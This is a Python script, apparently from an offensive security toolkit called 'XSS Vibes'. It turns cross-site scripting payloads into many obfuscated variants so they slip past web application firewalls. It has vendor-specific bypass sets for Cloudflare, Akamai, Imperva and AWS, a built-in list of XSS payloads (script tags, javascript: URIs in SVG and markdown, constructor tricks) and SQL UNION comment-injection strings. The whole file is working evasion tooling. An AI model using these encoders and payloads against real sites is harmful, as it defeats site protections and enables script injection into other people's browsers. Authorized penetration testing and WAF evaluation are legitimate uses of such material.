#!/usr/bin/env python3
"""
XSS Vibes - Advanced Payload Encoder
Creates maximum evasion payloads using multiple encoding techniques
"""

import base64
import html
import urllib.parse
import json
import sys
import re
from typing import List, Dict, Any


class AdvancedEncoder:
    """Advanced payload encoding for maximum WAF evasion"""

    def __init__(self):
        self.unicode_bypass_chars = {
            "a": ["а", "ａ", "𝖺", "𝕒", "𝓪", "𝒶", "𝓍", "ɑ"],
            "l": ["ⅼ", "𝖑", "𝕝", "𝓵", "𝒷", "ł", "ǀ", "|"],
            "e": ["е", "ｅ", "𝖾", "𝕖", "𝓮", "𝒾", "ℯ", "ҽ"],
            "r": ["г", "ｒ", "𝗋", "𝕣", "𝓻", "𝓇", "ℛ", "я"],
            "t": ["т", "ｔ", "𝗍", "𝕥", "𝓽", "𝓉", "τ", "†"],
        }

        self.zero_width_chars = [
            "\u200b",  # Zero width space
            "\u200c",  # Zero width non-joiner
            "\u200d",  # Zero width joiner
            "\u2060",  # Word joiner
            "\ufeff",  # Zero width no-break space
        ]

    def html_encode(self, payload: str) -> str:
        """HTML entity encoding"""
        return html.escape(payload, quote=True)

    def url_encode(self, payload: str) -> str:
        """URL encoding"""
        return urllib.parse.quote(payload, safe="")

    def double_url_encode(self, payload: str) -> str:
        """Double URL encoding"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def hex_encode(self, payload: str) -> str:
        """Hexadecimal encoding"""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def unicode_encode(self, payload: str) -> str:
        """Unicode encoding"""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def base64_encode(self, payload: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(payload.encode()).decode()

    def octal_encode(self, payload: str) -> str:
        """Octal encoding"""
        return "".join(f"\\{ord(c):03o}" for c in payload)

    def mixed_case_encode(self, payload: str) -> str:
        """Mixed case encoding"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result

    def unicode_bypass_encode(self, payload: str) -> str:
        """Replace characters with Unicode lookalikes"""
        result = payload
        for char, alternatives in self.unicode_bypass_chars.items():
            if char in result.lower():
                for alt in alternatives:
                    result = result.replace(char, alt, 1)
                    break
        return result

    def zero_width_inject(self, payload: str) -> str:
        """Inject zero-width characters"""
        result = ""
        zwc_index = 0
        for i, char in enumerate(payload):
            result += char
            if i % 3 == 0 and zwc_index < len(self.zero_width_chars):
                result += self.zero_width_chars[zwc_index % len(self.zero_width_chars)]
                zwc_index += 1
        return result

    def javascript_escape(self, payload: str) -> str:
        """JavaScript string escaping"""
        return payload.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'")

    def css_encode(self, payload: str) -> str:
        """CSS encoding"""
        return "".join(f"\\{ord(c):06x}" for c in payload)

    def create_polyglot(self, payload: str) -> str:
        """Create polyglot payload"""
        polyglots = [
            f"/*{payload}*/",
            f"<!--{payload}-->",
            f"#{payload}",
            f"//{payload}",
            f"%{payload}%",
        ]
        return "".join(polyglots)

    def xml_cdata_wrap(self, payload: str) -> str:
        """Wrap in XML CDATA"""
        return f"<![CDATA[{payload}]]>"

    def json_encode(self, payload: str) -> str:
        """JSON encoding"""
        return json.dumps(payload)

    def php_serialize(self, payload: str) -> str:
        """PHP serialization format"""
        return f's:{len(payload)}:"{payload}";'

    def sql_comment_inject(self, payload: str) -> str:
        """SQL comment injection"""
        return f"/*{payload}*/ UNION /*{payload}*/ SELECT /*{payload}*/"

    def generate_god_tier_variants(self, base_payload: str) -> Dict[str, str]:
        """Generate multiple encoded variants of a payload"""
        variants = {
            "original": base_payload,
            "html_encoded": self.html_encode(base_payload),
            "url_encoded": self.url_encode(base_payload),
            "double_url_encoded": self.double_url_encode(base_payload),
            "hex_encoded": self.hex_encode(base_payload),
            "unicode_encoded": self.unicode_encode(base_payload),
            "base64_encoded": self.base64_encode(base_payload),
            "octal_encoded": self.octal_encode(base_payload),
            "mixed_case": self.mixed_case_encode(base_payload),
            "unicode_bypass": self.unicode_bypass_encode(base_payload),
            "zero_width_injected": self.zero_width_inject(base_payload),
            "javascript_escaped": self.javascript_escape(base_payload),
            "css_encoded": self.css_encode(base_payload),
            "polyglot": self.create_polyglot(base_payload),
            "xml_cdata": self.xml_cdata_wrap(base_payload),
            "json_encoded": self.json_encode(base_payload),
            "php_serialized": self.php_serialize(base_payload),
        }

        # Combination encodings
        variants["url_html_combo"] = self.url_encode(self.html_encode(base_payload))
        variants["unicode_zero_width_combo"] = self.zero_width_inject(
            self.unicode_bypass_encode(base_payload)
        )
        variants["base64_url_combo"] = self.url_encode(self.base64_encode(base_payload))
        variants["hex_unicode_combo"] = self.unicode_encode(
            self.hex_encode(base_payload)
        )

        return variants

    def create_mutation_matrix(self, payloads: List[str]) -> Dict[str, Dict[str, str]]:
        """Create encoding matrix for multiple payloads"""
        matrix = {}
        for i, payload in enumerate(payloads):
            matrix[f"payload_{i+1}"] = self.generate_god_tier_variants(payload)
        return matrix

    def waf_specific_encodings(self, payload: str, waf_type: str) -> List[str]:
        """Generate WAF-specific bypass encodings"""
        encodings = []

        if waf_type.lower() == "cloudflare":
            encodings.extend(
                [
                    self.unicode_bypass_encode(payload),
                    self.zero_width_inject(payload),
                    f"/*{payload}*/",
                    self.double_url_encode(payload),
                ]
            )

        elif waf_type.lower() == "akamai":
            encodings.extend(
                [
                    self.hex_encode(payload),
                    self.css_encode(payload),
                    self.create_polyglot(payload),
                    self.octal_encode(payload),
                ]
            )

        elif waf_type.lower() == "imperva":
            encodings.extend(
                [
                    self.unicode_encode(payload),
                    self.base64_encode(payload),
                    self.php_serialize(payload),
                    self.xml_cdata_wrap(payload),
                ]
            )

        elif waf_type.lower() == "aws":
            encodings.extend(
                [
                    self.json_encode(payload),
                    self.mixed_case_encode(payload),
                    self.javascript_escape(payload),
                    self.url_encode(payload),
                ]
            )

        else:  # Generic WAF
            encodings.extend(
                [
                    self.unicode_bypass_encode(payload),
                    self.zero_width_inject(payload),
                    self.double_url_encode(payload),
                    self.create_polyglot(payload),
                ]
            )

        return encodings


def main():
    """Main execution function"""
    encoder = AdvancedEncoder()

    # GOD TIER base payloads
    god_tier_payloads = [
        "<script>alert(1)</script>",
        "constructor[constructor](alert(1))()",
        "𒀀='',𒉺=!𒀀+𒀀",
        "ale‌rt(1)",
        '<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>',
        "${alert(1)}",
        "</style><script>alert(1)</script>",
        "data:text/html,<script>alert(1)</script>",
        "<form id=x><output id=y>a</output></form><script>alert(x.y.value)</script>",
        "[click me](javascript:alert(1))",
    ]

    print("🔥 XSS Vibes - Advanced Payload Encoder")
    print("=" * 50)

    if len(sys.argv) > 1:
        # Encode specific payload
        payload = sys.argv[1]
        waf_type = sys.argv[2] if len(sys.argv) > 2 else "generic"

        print(f"🎯 Encoding payload: {payload}")
        print(f"🛡️ WAF type: {waf_type}")
        print()

        # Generate variants
        variants = encoder.generate_god_tier_variants(payload)

        print("📊 Encoded Variants:")
        print("-" * 30)
        for name, encoded in variants.items():
            print(f"🔸 {name}: {encoded[:100]}{'...' if len(encoded) > 100 else ''}")

        # WAF-specific encodings
        waf_encodings = encoder.waf_specific_encodings(payload, waf_type)
        print(f"\n🛡️ {waf_type.title()} WAF Specific Encodings:")
        print("-" * 40)
        for i, encoding in enumerate(waf_encodings, 1):
            print(
                f"🔹 Variant {i}: {encoding[:100]}{'...' if len(encoding) > 100 else ''}"
            )

    else:
        # Generate full mutation matrix
        print("🧬 Generating full GOD TIER mutation matrix...")
        matrix = encoder.create_mutation_matrix(god_tier_payloads)

        # Save to file
        with open("god_tier_encoded_matrix.json", "w") as f:
            json.dump(matrix, f, indent=2, ensure_ascii=False)

        print("✅ Matrix saved to: god_tier_encoded_matrix.json")

        # Display summary
        total_variants = sum(len(variants) for variants in matrix.values())
        print(
            f"📊 Generated {total_variants} encoded variants from {len(god_tier_payloads)} base payloads"
        )

        # Show sample
        print("\n🔍 Sample encodings for first payload:")
        first_payload = next(iter(matrix.values()))
        for encoding_type, encoded in list(first_payload.items())[:5]:
            print(
                f"  🔸 {encoding_type}: {encoded[:80]}{'...' if len(encoded) > 80 else ''}"
            )


if __name__ == "__main__":
    main()
